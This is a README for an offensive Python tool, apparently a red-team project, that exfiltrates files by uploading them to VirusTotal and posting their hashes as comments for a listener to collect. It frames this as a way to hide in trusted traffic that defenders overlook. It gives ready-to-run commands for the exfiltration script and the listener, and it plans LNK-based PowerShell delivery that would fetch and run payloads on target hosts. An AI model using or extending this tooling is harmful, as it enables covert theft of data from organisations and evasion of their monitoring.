# VT-Not-So-Pretty

Python data exfiltration tool that uses VirusTotal as its infrastructure.

As defenders we are often overwhelmed by the sheer amount of network traffic in a network and overlook traffic made to well known trusted sites without any known suspicious functionalities (like file/software sharing sites). And what other site is more well known and trusted to defenders them virustotal.  

My main goal was to use virustotal upload and download functionalities to transfer files back and forth without the need to use our own infrastructure, and breaking the diamond model from the defenders perspective. 

## Usage Example
The tool is pretty simple just provide it a path, your VT API key, and a hash of a file (already uploded to VT) to which you want the hashes of the files exfiltrated to be written, to be able to download then later on.    

```
python .\Vt-Not-So-Pretty.py -f "PATH_TO_EXFIL" -k YOUR_API_KEY -c HASH_TO_COMMENT_ON
```
Alternatively you can enter this when prompted:

![Vy-Not-So-Pretty](https://github.com/user-attachments/assets/780fec17-50da-4aef-a91e-d3682be5c573)


After done uploading the files to VT all you have to do is just run listener as follow:

```
python VT-Listener.py -f C:\Path\to\save\files\to -k "YOUR_PREMIUM_API_KEY" -c "HASH_TO_CHECK_COMMENTS_ON"
```
Or you can also enter this when prompted:

![image](https://github.com/user-attachments/assets/9b8454a3-d486-4ef8-866d-a1b53a21c081)

## Main Drawbacks:

1. The file size to transfer are limited to 650 MB per file - Could be solved with proper files splitting and compression.

2. Premium Subscription - In order to download files from VT premium subscription is needed, which could be pretty expensive.

## Disclaimer

This is an ongoing project, and in the future, I am planning to add more tools to it, for other uses as well, like for delivey using LNK files that contain a powershell code that download (or read in memory) file from VT and runs them on the target host.

## Upcoming updates:
Changing the endpoint to upload file larger then 35 MB.

Adding a cleanup stage option to delete the comments after downloading the files.
